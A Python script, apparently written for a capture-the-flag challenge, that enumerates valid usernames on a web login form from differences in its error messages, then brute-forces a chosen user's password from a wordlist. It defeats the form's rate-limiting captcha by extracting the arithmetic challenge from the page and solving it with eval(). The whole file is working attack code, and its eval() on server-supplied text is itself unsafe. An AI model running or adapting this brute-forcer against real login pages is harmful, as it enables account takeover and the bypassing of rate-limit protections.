'''

    lil python script for enumerating the usernames
         and passwords on the target machine as well
            as bypassing the rate limiting captcha :D
                                            ~ naomi tesla ♥

'''

import sys
import requests
import re


class c:
    red = "\033[31m"
    green = "\033[92m"
    pink = "\033[95m"


def help():
    print(
        """
    {g}Usage:
        {r}-x{g} [host]

        {r}-u{g} [username list]
        {r}-p{g} [password list] [username]
            """.format(
            g=c.green, r=c.red
        )
    )
    sys.exit()


try:
    if sys.argv[1] == "-h":
        help()
    host = sys.argv[2]
    mode = sys.argv[3]
    dictionary = sys.argv[4]
except IndexError:
    help()


with open(dictionary, "r") as file:
    if mode == "-u":
        usernames = file.read().split("\n")
    else:
        passwords = file.read().split("\n")


url = "http://" + host + "/login"
headers = {
    "Host": host,
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Referer": url,
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "53",
    "Origin": "http://" + host,
    "DNT": "1",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1",
}

responses = [0, 0, 0]  # [username, captcha, password]
rate_limit = False
captcha_solution = 0
flag = ""


def captcha_solve(response):
    n = response.find(" = ?")
    if n > 0:
        captcha = str(response[n - 8 : n])
        if captcha[0] == "0":
            captcha = captcha[1 : len(captcha)]
        solution = eval(captcha)
        return solution
    return 0


def status_check(response):
    responses[0] = response.find("does not exist")
    responses[1] = response.find("Invalid captcha")
    if mode == "-p":
        responses[2] = response.find("Invalid password")


def send_request(username, password):
    global rate_limit, captcha_solution, flag
    data = "username=" + username + "&password=" + password
    error = 0

    if rate_limit:
        data += "&captcha=" + str(captcha_solution)

    request = requests.post(url=url, data=data, headers=headers)
    response = request.text

    status_check(response)
    captcha_solution = captcha_solve(response)

    if len(response) < 100:
        error = 1

    if captcha_solve:
        rate_limit = True

    if sum(responses) + error == -2:
        if password != "x":
            html = re.compile("<.*?>")
            flag = re.sub(html, "", response.strip())[10:]
        return True
    return False


def main():
    def status(output):
        sys.stdout.write(c.green + "\rAttempting: " + c.red + output)
        sys.stdout.flush()

    if mode == "-u":
        for username in usernames:
            status(username)
            if send_request(username, "x"):
                print("\n" + c.green + "Username Found! " + c.red + username)
                break
    elif mode == "-p":
        for password in passwords:
            username = sys.argv[5]
            status(username + ":" + password)
            if send_request(username, password):
                print(
                    "\n" + c.green + username + "'s password found! " + c.red + password
                )
                print("\n" + c.green + "Flag: " + c.red + flag)
                break
    else:
        help()

    sys.stdout.write("\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.stdout.write("\n")
        sys.exit()
